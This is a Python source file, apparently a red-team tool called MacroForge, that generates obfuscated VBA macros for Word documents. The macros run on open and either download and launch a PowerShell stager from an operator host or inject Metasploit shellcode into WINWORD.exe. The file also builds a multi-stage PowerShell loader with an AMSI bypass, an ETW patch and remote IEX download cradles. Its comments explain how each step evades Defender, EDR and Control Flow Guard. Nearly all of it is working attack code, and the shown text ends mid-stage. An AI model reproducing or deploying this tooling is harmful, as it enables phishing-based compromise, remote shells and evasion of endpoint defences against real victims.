#!/usr/bin/env python3
"""
MacroForge - Obfuscated VBA Macro Payload Generator
For authorized penetration testing only.

Usage:
  python MacroForge.py --lhost 10.10.16.7
  python MacroForge.py --lhost 10.10.16.7 --lport 4444 --arch x64 --payload reverse_https
  python MacroForge.py --lhost 10.10.16.7 --serve   (auto-start HTTP server + handler)
"""

import argparse
import os
import subprocess
import sys
import random
import string
import threading
import http.server
import socketserver
import time
import base64

BANNER = r"""
  __  __                     _____                    
 |  \/  | __ _  ___ _ __ __|  ___|__  _ __ __ _  ___ 
 | |\/| |/ _` |/ __| '__/ _ \ |_ / _ \| '__/ _` |/ _ \
 | |  | | (_| | (__| | | (_) |  _| (_) | | | (_| |  __/
 |_|  |_|\__,_|\___|_|  \___/|_|  \___/|_|  \__, |\___|
                                             |___/      
         Obfuscated VBA Macro Generator v3.0
         + In-process shellcode injection (no PS1)
         + 3-stage PS1 fallback | AMSI/ETW bypass | --debug beacons
"""

# ─────────────────── Payload Mapping ───────────────────

PAYLOADS = {
    "reverse_tcp": {
        "x86": "windows/meterpreter/reverse_tcp",
        "x64": "windows/x64/meterpreter/reverse_tcp",
    },
    "reverse_https": {
        "x86": "windows/meterpreter/reverse_https",
        "x64": "windows/x64/meterpreter/reverse_https",
    },
    "reverse_http": {
        "x86": "windows/meterpreter/reverse_http",
        "x64": "windows/x64/meterpreter/reverse_http",
    },
    "shell_tcp": {
        "x86": "windows/shell_reverse_tcp",
        "x64": "windows/x64/shell_reverse_tcp",
    },
    # ── stageless variants (full meterpreter in one blob, no stage download) ──
    # Larger shellcode (~200KB) but survives strict egress / stage filtering.
    # Use these when staged variants connect but never produce a session.
    "stageless_tcp": {
        "x86": "windows/meterpreter_reverse_tcp",
        "x64": "windows/x64/meterpreter_reverse_tcp",
    },
    "stageless_https": {
        "x86": "windows/meterpreter_reverse_https",
        "x64": "windows/x64/meterpreter_reverse_https",
    },
    "stageless_http": {
        # Plain HTTP (not TLS). Use when the target is forced through a
        # corporate web proxy that breaks meterpreter_reverse_https handshakes.
        "x86": "windows/meterpreter_reverse_http",
        "x64": "windows/x64/meterpreter_reverse_http",
    },
}

# ─────────────────── Obfuscation Methods ───────────────────

METHODS = ["caesar", "xor", "base64", "charcode"]


def random_name(length=6, exclude=None):
    """Random variable name that won't collide with exclude set."""
    exclude = exclude or set()
    while True:
        name = random.choice(string.ascii_lowercase) + "".join(
            random.choices(string.ascii_lowercase + string.digits, k=length - 1)
        )
        if name not in exclude:
            return name


# ── Caesar: shift each printable ASCII char ──

def caesar_encode(text, key):
    result = []
    for ch in text:
        code = ord(ch)
        if 33 < code < 127:
            new_code = code + key
            if new_code >= 127:
                new_code = 34 + (new_code - 127)
            result.append(chr(new_code))
        else:
            result.append(ch)
    return "".join(result)


def caesar_vba_decode(fn, key):
    return f"""Private Function {fn}(s As String) As String
    Dim i As Long, a As Long
    For i = 1 To Len(s)
        a = Asc(Mid(s, i, 1))
        If a > 33 And a < 127 Then
            {fn} = {fn} & Chr(a - {key})
        Else
            {fn} = {fn} & Mid(s, i, 1)
        End If
    Next i
End Function"""


# ── XOR: XOR each byte with key, store as hex string ──

def xor_encode(text, key):
    return "".join(f"{ord(c) ^ key:02X}" for c in text)


def xor_vba_decode(fn, key):
    return f"""Private Function {fn}(s As String) As String
    Dim i As Long, v As Long
    For i = 1 To Len(s) Step 2
        v = CLng("&H" & Mid(s, i, 2))
        {fn} = {fn} & Chr(v Xor {key})
    Next i
End Function"""


# ── Base64 Reverse: base64 encode then reverse the string ──

def b64rev_encode(text, key=None):
    b = base64.b64encode(text.encode()).decode()
    return b[::-1]


def b64rev_vba_decode(fn, key):
    return f"""Private Function {fn}(s As String) As String
    Dim r As String, i As Long
    For i = Len(s) To 1 Step -1
        r = r & Mid(s, i, 1)
    Next i
    Dim x As Object, n As Object
    Set x = CreateObject("MSXML2.DOMDocument")
    Set n = x.createElement("b")
    n.DataType = "bin.base64"
    n.Text = r
    {fn} = StrConv(n.nodeTypedValue, vbUnicode)
End Function"""


# ── CharCode: store as comma-separated (ASCII + offset) values ──

def charcode_encode(text, key):
    return ",".join(str(ord(c) + key) for c in text)


def charcode_vba_decode(fn, key):
    return f"""Private Function {fn}(s As String) As String
    Dim p() As String, i As Long
    p = Split(s, ",")
    For i = 0 To UBound(p)
        {fn} = {fn} & Chr(CLng(p(i)) - {key})
    Next i
End Function"""


# ── Encoder dispatcher ──

def encode_string(method, text, key):
    if method == "caesar":
        return caesar_encode(text, key)
    elif method == "xor":
        return xor_encode(text, key)
    elif method == "base64":
        return b64rev_encode(text, key)
    elif method == "charcode":
        return charcode_encode(text, key)


def vba_decode_func(method, fn_name, key):
    if method == "caesar":
        return caesar_vba_decode(fn_name, key)
    elif method == "xor":
        return xor_vba_decode(fn_name, key)
    elif method == "base64":
        return b64rev_vba_decode(fn_name, key)
    elif method == "charcode":
        return charcode_vba_decode(fn_name, key)


def default_key(method):
    if method == "caesar":
        return random.randint(1, 5)
    elif method == "xor":
        return random.randint(10, 250)
    elif method == "base64":
        return 0
    elif method == "charcode":
        return random.randint(50, 200)


# ─────────────────── VBA Generation ───────────────────

def verify_encoding(method, encoded, key, original):
    """Verify a round-trip encode/decode in Python."""
    if method == "caesar":
        decoded = "".join(
            chr(ord(c) - key) if 33 < ord(c) < 127 else c for c in encoded
        )
    elif method == "xor":
        decoded = "".join(
            chr(int(encoded[i:i+2], 16) ^ key) for i in range(0, len(encoded), 2)
        )
    elif method == "base64":
        decoded = base64.b64decode(encoded[::-1]).decode()
    elif method == "charcode":
        decoded = "".join(
            chr(int(v) - key) for v in encoded.split(",")
        )
    assert decoded == original, f"Verify failed: {method} decode({encoded[:30]}...) != {original!r}"


def generate_vba(lhost, http_port, method, key, stage_filename, debug=False):
    """Generate obfuscated VBA macro with selected method.

    When debug=True, beacon HTTP GETs are inserted at every major step so the
    HTTP server access-log reveals exactly where execution stops on the target.
    """

    url = f"http://{lhost}:{http_port}/{stage_filename}"
    temp_name = random_name(8) + ".ps1"

    enc = lambda s: encode_string(method, s, key)

    strings = {
        "xmlhttp":  ("Msxml2.XmlHttp",),
        "get":      ("GET",),
        "url":      (url,),
        "temp":     ("TEMP",),
        "fname":    (temp_name,),
        "fso":      ("Scripting.FileSystemObject",),
        "psh":      ("powershell",),
        "wmi_pre":  ("winmgmts:Win32",),
        "wmi_suf":  ("Process",),
    }
    if debug:
        strings["bcn_url"] = (f"http://{lhost}:{http_port}/__m/",)

    e = {}
    for name, (original,) in strings.items():
        encoded = enc(original)
        verify_encoding(method, encoded, key, original)
        e[name] = encoded

    fn_main   = random_name(5)
    fn_decode = random_name(4, exclude={fn_main})
    fn_bcn    = random_name(4, exclude={fn_main, fn_decode})

    # ── Beacon sub + inline calls (only when --debug) ──
    if debug:
        beacon_sub = f"""

Private Sub {fn_bcn}(s As String)
    On Error Resume Next
    Dim x As Object
    Set x = CreateObject({fn_decode}("{e['xmlhttp']}"))
    x.Open {fn_decode}("{e['get']}"), {fn_decode}("{e['bcn_url']}") & s, False
    x.send
End Sub"""
        b_start  = f'    {fn_bcn} "start"\n'
        b_dl     = f'    {fn_bcn} "dl_" & Len(h.responseText)\n'
        b_save   = f'    {fn_bcn} "save"\n'
        b_spawn  = f'    {fn_bcn} "spawn_" & r\n'
        # After spawn, wait 3s then check whether the .ps1 still exists in %TEMP%.
        # ps_file_gone     => Defender real-time scan quarantined it (static signature)
        # ps_file_present  => exec-side block (AMSI parse, AppLocker, CLM, etc.)
        end_var = random_name(4, exclude={fn_main, fn_decode, fn_bcn})
        b_check = f"""    Dim {end_var} As Single
    {end_var} = Timer + 3
    Do While Timer < {end_var}
        DoEvents
    Loop
    If fs.FileExists(fp) Then
        {fn_bcn} "ps_file_present"
    Else
        {fn_bcn} "ps_file_gone"
    End If
"""
    else:
        beacon_sub = ""
        b_start = b_dl = b_save = b_spawn = b_check = ""

    vba = f"""Sub AutoOpen()
    {fn_main}
End Sub

Sub Document_Open()
    {fn_main}
End Sub

Private Sub {fn_main}()
    On Error Resume Next
{b_start}
    Dim h As Object
    Set h = CreateObject({fn_decode}("{e['xmlhttp']}"))
    h.Open {fn_decode}("{e['get']}"), {fn_decode}("{e['url']}"), False
    h.send
{b_dl}
    Dim fp As String
    fp = Environ({fn_decode}("{e['temp']}")) & Chr(92) & {fn_decode}("{e['fname']}")

    Dim fs As Object
    Set fs = CreateObject({fn_decode}("{e['fso']}"))
    Dim fw As Object
    Set fw = fs.CreateTextFile(fp, True)
    fw.Write h.responseText
    fw.Close
{b_save}
    Dim cmd As String
    cmd = {fn_decode}("{e['psh']}") & " -nop -w 1 -ep bypass -f " & Chr(34) & fp & Chr(34)

    Dim wmi As Object
    Set wmi = GetObject({fn_decode}("{e['wmi_pre']}") & Chr(95) & {fn_decode}("{e['wmi_suf']}"))
    Dim r As Long
    wmi.Create cmd, Null, Null, r
{b_spawn}{b_check}End Sub
{beacon_sub}

{vba_decode_func(method, fn_decode, key)}"""
    return vba


# ─────────────────── VBA Shellcode Injector ───────────────────


def generate_vba_shellcode(sc_bytes, lhost, http_port, debug=False, force_callback=None):
    """Generate a self-contained VBA macro that injects shellcode into WINWORD.exe.

    Why this path beats the staged PS1 path against Defender:
      * No powershell.exe ever spawns -> no AMSI for PS, no AppLocker
        script enforcement, no CLM, no script-block logging.
      * Execution stays inside WINWORD.exe -> no fresh process to scan.
      * Shellcode never lands on disk; it's an obfuscated literal in the .vba.

    Anti-EDR injection design (this is what makes meterpreter actually land):
      1. VirtualAlloc(MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
         Allocating RWX up-front is the #1 static heuristic; allocate RW first
         so the page looks like data.
      2. RtlMoveMemory shellcode -> RW page
      3. Erase the source Byte() buffer (zero out + ReDim 0) so there isn't a
         second copy of the shellcode laying around for in-process AMSI scans.
      4. Sleep 250ms to break the alloc->write->protect->exec timing pattern
         that some EDRs match against.
      5. VirtualProtect(RW -> PAGE_EXECUTE_READ)
      6. Trigger via a randomly-chosen callback API (EnumWindows /
         CertEnumSystemStore / EnumDateFormatsExEx). Each build picks one,
         splitting the signature footprint across builds.

    Layout:
      AutoOpen() / Document_Open()  -> entrypoint
      <fn_main>                     -> orchestrate the steps above
      <fn_chunkN>() As String       -> each returns a slice of the hex blob.
                                       Splitting is REQUIRED: VBA enforces a
                                       hard ~64KB per-compiled-procedure limit.
    """

    if not sc_bytes:
        raise ValueError("Empty shellcode")

    # ── Per-build XOR key for the shellcode literal ──
    sc_key = random.randint(1, 255)
    sc_enc = bytes((b ^ sc_key) & 0xFF for b in sc_bytes)
    sc_hex = "".join(f"{b:02X}" for b in sc_enc)

    # Chunk hex string into <=200-char pieces to stay well under VBA line limit.
    chunk_size = 200
    chunks = [sc_hex[i:i + chunk_size] for i in range(0, len(sc_hex), chunk_size)]

    # Group chunks into separate Functions to dodge VBA's hard ~64KB
    # per-procedure compiled-code limit.
    LINES_PER_FN = 100
    groups = [chunks[i:i + LINES_PER_FN] for i in range(0, len(chunks), LINES_PER_FN)]

    # ── Random identifiers ──
    used = set()
    def name(n=6):
        nm = random_name(n, exclude=used)
        used.add(nm)
        return nm

    fn_main = name(5)
    fn_bcn  = name(4)
    V_VA = name(5)
    V_RM = name(5)
    V_VP = name(5)   # VirtualProtect
    V_SL = name(5)   # Sleep
    V_S  = name(4)
    V_SC = name(4)
    V_AD = name(4)
    V_OLD = name(4)
    V_VPRET = name(4)
    V_I  = name(3)
    V_N  = name(3)

    # ── Pick a callback / execution-trigger primitive ──
    # IMPORTANT: each option has param requirements that must be satisfied,
    # OR a different mechanism that bypasses CFG entirely.
    callback_apis = {
        "enumwindows": (
            "EnumWindows", "user32",
            "ByVal lpEnumFunc As {PTR}, ByVal lParam As {PTR}",
            "{FN} {ADDR}, 0",
        ),
        "certenumsystemstore": (
            # dwFlags MUST be a valid CERT_SYSTEM_STORE_LOCATION value, NOT 0,
            # or the API returns ERROR_INVALID_PARAMETER without invoking the
            # callback. 0x00010000 = CERT_SYSTEM_STORE_CURRENT_USER.
            "CertEnumSystemStore", "crypt32",
            "ByVal dwFlags As Long, ByVal pvSystemStoreLocationPara As {PTR}, ByVal pvArg As {PTR}, ByVal pfnEnum As {PTR}",
            "{FN} &H10000, 0, 0, {ADDR}",
        ),
        "enumdateformatsw": (
            # Locale=0 may skip the callback on some Windows versions; use
            # LOCALE_USER_DEFAULT (0x400) and DATE_SHORTDATE (0x1).
            "EnumDateFormatsW", "kernel32",
            "ByVal lpDateFmtEnumProc As {PTR}, ByVal Locale As Long, ByVal dwFlags As Long",
            "{FN} {ADDR}, &H400, &H1",
        ),
        # ── Special: not a callback API, a fiber-switch CFG bypass ──
        # Office 16+ enables Control Flow Guard. EnumWindows / Cert* /
        # EnumDateFormats* all go through __guard_check_icall_fptr; jumping
        # to a non-image, non-CFG-valid address fails-fast and silently kills
        # WINWORD.exe before any shellcode runs.
        # Fibers use a different stack-switch path (RtlpFiberSwitch) that does
        # NOT go through CFG, so the shellcode entry point isn't validated.
        # This is the OSEP-textbook CFG bypass for VBA injection.
        "fiber": ("__FIBER__", "kernel32", "", ""),
    }
    if force_callback and force_callback in callback_apis:
        cb_alias, cb_lib, cb_sig, cb_call = callback_apis[force_callback]
    else:
        # Random selection avoids the fiber path by default to keep behavior
        # explicit (it requires extra Declares); user opts in via --callback.
        non_fiber = {k: v for k, v in callback_apis.items() if k != "fiber"}
        cb_alias, cb_lib, cb_sig, cb_call = random.choice(list(non_fiber.values()))
    V_CB = name(5)
    is_fiber = (cb_alias == "__FIBER__")

    cb_sig_vba7 = cb_sig.replace("{PTR}", "LongPtr")
    cb_sig_vba6 = cb_sig.replace("{PTR}", "Long")
    cb_invoke   = cb_call.replace("{FN}", V_CB).replace("{ADDR}", V_AD) if not is_fiber else ""

    # Fiber mode needs a different set of Declares.
    if is_fiber:
        V_CTF = name(5)   # ConvertThreadToFiber
        V_CRF = name(5)   # CreateFiber
        V_STF = name(5)   # SwitchToFiber
        callback_decls_vba7 = f"""    Private Declare PtrSafe Function {V_CTF} Lib "kernel32" Alias "ConvertThreadToFiber" (ByVal lpParameter As LongPtr) As LongPtr
    Private Declare PtrSafe Function {V_CRF} Lib "kernel32" Alias "CreateFiber" (ByVal dwStackSize As LongPtr, ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr) As LongPtr
    Private Declare PtrSafe Sub {V_STF} Lib "kernel32" Alias "SwitchToFiber" (ByVal lpFiber As LongPtr)"""
        callback_decls_vba6 = f"""    Private Declare Function {V_CTF} Lib "kernel32" Alias "ConvertThreadToFiber" (ByVal lpParameter As Long) As Long
    Private Declare Function {V_CRF} Lib "kernel32" Alias "CreateFiber" (ByVal dwStackSize As Long, ByVal lpStartAddress As Long, ByVal lpParameter As Long) As Long
    Private Declare Sub {V_STF} Lib "kernel32" Alias "SwitchToFiber" (ByVal lpFiber As Long)"""
        # Fiber switch sequence
        cb_invoke_block = f"""    #If VBA7 Then
        Dim mainFib As LongPtr
        Dim scFib As LongPtr
    #Else
        Dim mainFib As Long
        Dim scFib As Long
    #End If
    mainFib = {V_CTF}(0)
    scFib = {V_CRF}(0, {V_AD}, 0)
    If scFib <> 0 Then
        {V_STF} scFib
    End If"""
        cb_label_for_beacon = "fiber"
    else:
        callback_decls_vba7 = f'    Private Declare PtrSafe Function {V_CB} Lib "{cb_lib}" Alias "{cb_alias}" ({cb_sig_vba7}) As Long'
        callback_decls_vba6 = f'    Private Declare Function {V_CB} Lib "{cb_lib}" Alias "{cb_alias}" ({cb_sig_vba6}) As Long'
        cb_invoke_block = f"    {cb_invoke}"
        cb_label_for_beacon = cb_alias.lower()

    # ── Beacons (only when --debug) ──
    if debug:
        bcn_url = f"http://{lhost}:{http_port}/__m/"
        beacon_sub = f"""

Private Sub {fn_bcn}(s As String)
    On Error Resume Next
    Dim x As Object
    Set x = CreateObject("Msxml2.XmlHttp")
    x.Open "GET", "{bcn_url}" & s, False
    x.send
End Sub"""
        b_start    = f'    {fn_bcn} "start"\n'
        b_built    = f'    {fn_bcn} "built_" & Len({V_S})\n'
        b_decoded  = f'    {fn_bcn} "decoded_" & ({V_N})\n'
        b_alloc_rw = f'    {fn_bcn} "alloc_rw_" & {V_AD}\n'
        b_copied   = f'    {fn_bcn} "copied"\n'
        b_erased   = f'    {fn_bcn} "erased"\n'
        b_protect  = f'    {fn_bcn} "protect_rx_ret_" & {V_VPRET} & "_old_" & Hex({V_OLD})\n'
        b_invoke   = f'    {fn_bcn} "invoke_{cb_label_for_beacon}"\n'
        b_executed = f'    {fn_bcn} "executed"\n'
    else:
        beacon_sub = ""
        b_start = b_built = b_decoded = b_alloc_rw = b_copied = ""
        b_erased = b_protect = b_invoke = b_executed = ""

    # ── Build chunk Functions ──
    chunk_funcs = []
    for g in groups:
        fname = name(5)
        body = "\n".join(f'    r = r & "{c}"' for c in g)
        chunk_funcs.append((fname, f"""
Private Function {fname}() As String
    Dim r As String
    r = ""
{body}
    {fname} = r
End Function"""))
    build_lines = "\n".join(
        f'    {V_S} = {V_S} & {fname}()' for fname, _ in chunk_funcs
    )
    chunk_func_defs = "\n".join(src for _, src in chunk_funcs)

    vba = f"""#If VBA7 Then
    Private Declare PtrSafe Function {V_VA} Lib "kernel32" Alias "VirtualAlloc" (ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Sub {V_RM} Lib "kernel32" Alias "RtlMoveMemory" (ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As LongPtr)
    Private Declare PtrSafe Function {V_VP} Lib "kernel32" Alias "VirtualProtect" (ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long
    Private Declare PtrSafe Sub {V_SL} Lib "kernel32" Alias "Sleep" (ByVal dwMilliseconds As Long)
{callback_decls_vba7}
#Else
    Private Declare Function {V_VA} Lib "kernel32" Alias "VirtualAlloc" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
    Private Declare Sub {V_RM} Lib "kernel32" Alias "RtlMoveMemory" (ByVal Destination As Long, ByRef Source As Any, ByVal Length As Long)
    Private Declare Function {V_VP} Lib "kernel32" Alias "VirtualProtect" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long
    Private Declare Sub {V_SL} Lib "kernel32" Alias "Sleep" (ByVal dwMilliseconds As Long)
{callback_decls_vba6}
#End If

Sub AutoOpen()
    {fn_main}
End Sub

Sub Document_Open()
    {fn_main}
End Sub

Private Sub {fn_main}()
    On Error Resume Next
{b_start}
    Dim {V_S} As String
    {V_S} = ""
{build_lines}
{b_built}
    Dim {V_N} As Long
    {V_N} = Len({V_S}) \\ 2
    Dim {V_SC}() As Byte
    ReDim {V_SC}({V_N} - 1)
    Dim {V_I} As Long
    For {V_I} = 0 To {V_N} - 1
        {V_SC}({V_I}) = CByte((CLng("&H" & Mid({V_S}, {V_I} * 2 + 1, 2))) Xor {sc_key})
    Next {V_I}
    {V_S} = ""
{b_decoded}
    #If VBA7 Then
        Dim {V_AD} As LongPtr
    #Else
        Dim {V_AD} As Long
    #End If
    ' Step 1: allocate RW, not RWX. RWX is the #1 EDR heuristic.
    {V_AD} = {V_VA}(0, {V_N}, &H3000, &H4)
    If {V_AD} = 0 Then Exit Sub
{b_alloc_rw}
    ' Step 2: copy shellcode into RW page.
    {V_RM} {V_AD}, {V_SC}(0), {V_N}
{b_copied}
    ' Step 3: zero the source buffer + free it. Removes the second
    ' shellcode copy from the macro string heap.
    For {V_I} = 0 To {V_N} - 1
        {V_SC}({V_I}) = 0
    Next {V_I}
    Erase {V_SC}
{b_erased}
    ' Step 4: settle for 250ms. Defender memory scans on Office processes
    ' often fire on the alloc->write->protect->exec sequence happening
    ' inside one tick; sleeping breaks that pattern.
    {V_SL} 250
    ' Step 5: flip the page to RX (no W). Avoids the RWX detection AND
    ' avoids the just-as-suspicious "still RW but executing".
    Dim {V_OLD} As Long
    Dim {V_VPRET} As Long
    {V_VPRET} = {V_VP}({V_AD}, {V_N}, &H20, {V_OLD})
{b_protect}
    ' Step 6: trigger via callback API ({cb_alias}).
{b_invoke}
{cb_invoke_block}
{b_executed}
End Sub
{beacon_sub}
{chunk_func_defs}
"""
    return vba


# ─────────────────── PS1 Generation ───────────────────

IS_WINDOWS = sys.platform.startswith("win")


def _bin_candidates(msf_path, name):
    """Return candidate paths for a Metasploit binary."""
    names = [name + ".bat", name] if IS_WINDOWS else [name]
    paths = []
    for n in names:
        paths.append(os.path.join(msf_path, "bin", n))
        paths.append(os.path.join(msf_path, n))
    # Kali / Linux global paths
    if not IS_WINDOWS:
        paths.append(os.path.join("/usr", "bin", name))
        paths.append(os.path.join("/usr", "share", "metasploit-framework", name))
    return paths


def find_msfvenom(msf_path):
    """Locate msfvenom binary."""
    for c in _bin_candidates(msf_path, "msfvenom"):
        if os.path.exists(c):
            return c
    return None


def find_msfconsole(msf_path):
    """Locate msfconsole binary."""
    for c in _bin_candidates(msf_path, "msfconsole"):
        if os.path.exists(c):
            return c
    return None


def run_msfvenom_raw(msf_path, payload_full, lhost, lport, work_dir, extra_args=None,
                     encoder=None, iterations=1):
    """Run msfvenom and return raw shellcode bytes.

    extra_args: optional list of extra argv tokens (e.g. ["CMD=calc.exe"]).
                When provided, LHOST/LPORT are NOT auto-added since exec-style
                payloads don't take them.
    encoder:    msfvenom encoder name (e.g. 'x64/xor_dynamic',
                'x86/shikata_ga_nai'). None = no encoder.
    iterations: encoder iteration count.
    """
    msfvenom = find_msfvenom(msf_path)
    if not msfvenom:
        print(f"[-] ERROR: msfvenom not found in {msf_path}")
        print("    Use --msf-path to specify Metasploit location.")
        sys.exit(1)

    if encoder:
        print(f"[*] Running msfvenom: {payload_full}  (-e {encoder} -i {iterations} -f raw)")
    else:
        print(f"[*] Running msfvenom: {payload_full}  (-f raw)")
    tmp_path = os.path.join(work_dir, ".sc_" + random_name(6) + ".bin")
    cmd = [msfvenom, "-p", payload_full]
    if extra_args:
        cmd.extend(extra_args)
    else:
        cmd.extend([f"LHOST={lhost}", f"LPORT={lport}"])
    if encoder:
        cmd.extend(["-e", encoder, "-i", str(iterations)])
    cmd.extend(["-f", "raw", "-o", tmp_path])

    result = subprocess.run(cmd, capture_output=True, text=True)
    if not os.path.exists(tmp_path):
        print(f"[-] msfvenom failed to create payload.")
        print(f"    stdout: {result.stdout}")
        print(f"    stderr: {result.stderr}")
        sys.exit(1)
    with open(tmp_path, "rb") as f:
        sc = f.read()
    os.remove(tmp_path)
    if not sc:
        print("[-] msfvenom produced empty shellcode.")
        sys.exit(1)
    return sc


def _ps_var_pool(count):
    """Generate `count` unique random PowerShell-safe identifiers."""
    pool = set()
    out = []
    while len(out) < count:
        n = random.choice(string.ascii_lowercase) + "".join(
            random.choices(string.ascii_letters + string.digits, k=random.randint(6, 10))
        )
        if n not in pool:
            pool.add(n)
            out.append(n)
    return out


def generate_ps1(msf_path, payload_full, lhost, lport, http_port, output_path, debug=False):
    """Generate 3-stage PS1 launcher with on-the-fly remote staging.

    Why 3 stages instead of 2:
      The previous 2-stage layout embedded an XOR+base64 blob of stage2 directly
      inside stage1, putting ~5 KB of high-entropy base64 plus a -bxor decrypt
      loop on disk. Defender's AMSI engine sees the entire buffer at parse time
      and is very good at flagging that exact pattern.

    New layout (only stage1 ever lands on disk on the target):
      stage1  (minimal launcher, on disk in %TEMP%)
        * AMSI bypass via runtime-built type/field markers (no 'AmsiUtils' /
          'amsiInitFailed' literals)
        * IEX downloads stage2 from the operator's HTTP server and runs it
        * No base64 blobs, no Add-Type, no shellcode array
      stage2  (served from operator HTTP server, executed in memory only)
        * Add-Type + Win32 P/Invoke
        * ETW patch
        * IEX downloads stage3
      stage3  (served from operator HTTP server, executed in memory only)
        * Encrypted shellcode + decrypt loop
        * VirtualAlloc + Marshal.Copy + CreateThread

    Beacons (when debug=True) fire at http://lhost:http_port/__p/<step>.

    Files written to output_dir:
      <stage_filename>.ps1  -> the file the macro pulls and writes to %TEMP%
      stage2.txt            -> served from the same HTTP root
      stage3.txt            -> served from the same HTTP root
    """

    msfvenom = find_msfvenom(msf_path)
    if not msfvenom:
        print(f"[-] ERROR: msfvenom not found in {msf_path}")
        print("    Use --msf-path to specify Metasploit location.")
        sys.exit(1)

    print(f"[*] Running msfvenom: {payload_full}  (-f raw)")

    tmp_path = output_path + ".bin"
    cmd = [
        msfvenom, "-p", payload_full,
        f"LHOST={lhost}", f"LPORT={lport}",
        "-f", "raw", "-o", tmp_path,
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if not os.path.exists(tmp_path):
        print(f"[-] msfvenom failed to create payload.")
        print(f"    stdout: {result.stdout}")
        print(f"    stderr: {result.stderr}")
        sys.exit(1)

    with open(tmp_path, "rb") as f:
        sc = f.read()
    os.remove(tmp_path)

    if not sc:
        print("[-] msfvenom produced empty shellcode.")
        sys.exit(1)

    # ── Shellcode XOR ──
    sc_key = random.randint(1, 255)
    sc_enc = bytes((b ^ sc_key) & 0xFF for b in sc)
    sc_array = ",".join(f"0x{b:02x}" for b in sc_enc)

    # ── Random identifiers ──
    (V_T, V_F, V_DEF, V_API, V_NTDLL, V_ETW, V_OLD,
     V_BUF, V_KEY, V_IDX, V_ALLOC, V_THREAD, V_BCN,
     V_S2URL, V_S3URL, V_WC) = _ps_var_pool(16)
    type_name = "C" + random_name(7)
    ns_name   = "N" + random_name(7)

    # ── Random staging URLs ──
    stage2_name = random_name(6) + ".txt"
    stage3_name = random_name(6) + ".txt"
    stage2_url = f"http://{lhost}:{http_port}/{stage2_name}"
    stage3_url = f"http://{lhost}:{http_port}/{stage3_name}"

    # ── Beacon helper (only when --debug) ──
    if debug:
        beacon_fn = (
            f"function {V_BCN}($s){{ try{{ "
            f"(New-Object System.Net.WebClient).DownloadString("
            f"('http://{lhost}:{http_port}/__p/' + $s)) | Out-Null"
            f" }}catch{{}} }}\n"
        )
        b = lambda step: f"{V_BCN} '{step}'\n"
    else:
        beacon_fn = ""
        b = lambda step: ""

    # ── STAGE 3 (innermost, in-memory only, served from HTTP) ──
    # Holds the shellcode + executor. Lives only as a string in stage2's IEX.
    stage3 = f"""{b('stage3_in')}[Byte[]] ${V_BUF} = {sc_array}
${V_KEY} = {sc_key}
for (${V_IDX} = 0; ${V_IDX} -lt ${V_BUF}.Length; ${V_IDX}++) {{
    ${V_BUF}[${V_IDX}] = ${V_BUF}[${V_IDX}] -bxor ${V_KEY}
}}
{b('decrypted')}${V_ALLOC} = ${V_API}::VirtualAlloc(0, [Math]::Max(${V_BUF}.Length, 0x1000), 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy(${V_BUF}, 0, ${V_ALLOC}, ${V_BUF}.Length)
{b('before_exec')}${V_THREAD} = ${V_API}::CreateThread(0, 0, ${V_ALLOC}, 0, 0, 0)
[System.Threading.Thread]::Sleep(86400000)
"""

    # ── STAGE 2 (Win32 + ETW patch + pull stage3, served from HTTP) ──
    stage2 = f"""{b('stage2_in')}${V_DEF} = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("kernel32.dll")]
public static extern IntPtr GetModuleHandle(string lpModuleName);
[DllImport("kernel32.dll")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
[DllImport("kernel32.dll")]
public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
"@
${V_API} = Add-Type -MemberDefinition ${V_DEF} -Name "{type_name}" -Namespace "{ns_name}" -PassThru
{b('addtype')}${V_NTDLL} = ${V_API}::GetModuleHandle(('nt'+'dll.dll'))
if (${V_NTDLL} -ne [IntPtr]::Zero) {{
    ${V_ETW} = ${V_API}::GetProcAddress(${V_NTDLL}, ('Et'+'wEv'+'entWrite'))
    if (${V_ETW} -ne [IntPtr]::Zero) {{
        ${V_OLD} = 0
        ${V_API}::VirtualProtect(${V_ETW}, 1, 0x40, [ref]${V_OLD}) | Out-Null
        [System.Runtime.InteropServices.Marshal]::WriteByte(${V_ETW}, 0xC3)
    }}
}}
{b('etw')}${V_S3URL} = '{stage3_url}'
${V_WC} = New-Object System.Net.WebClient
IEX (${V_WC}.DownloadString(${V_S3URL}))
"""

    # ── STAGE 1 (only thing on disk; minimum suspicious surface) ──
    # AMSI marker strings built at runtime so 'AmsiUtils' / 'amsiInitFailed'
    # never appear as literals in the file Defender scans.
    amsi_type_marker  = "[char]" + "+[char]".join(str(ord(c)) for c in "siUtils")
    amsi_field_marker = "[char]" + "+[char]".join(str(ord(c)) for c in "Failed")

    V_M1 = random_name(5)
    V_M2 = random_name(5)

    stage1 = f"""$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference     = 'SilentlyContinue'
{beacon_fn}{b('loaded')}${V_M1} = -join ({amsi_type_marker})
${V_M2} = -join ({amsi_field_marker})
${V_T} = $null
foreach (${V_F} in [Ref].Assembly.GetTypes()) {{
    if (${V_F}.Name.EndsWith(${V_M1})) {{ ${V_T} = ${V_F}; break }}
}}
if (${V_T}) {{
    foreach (${V_F} in ${V_T}.GetFields('NonPublic,Static')) {{
        if (${V_F}.Name.EndsWith(${V_M2})) {{ ${V_F}.SetValue($null,$true); break }}
    }}
}}
{b('amsi')}${V_S2URL} = '{stage2_url}'
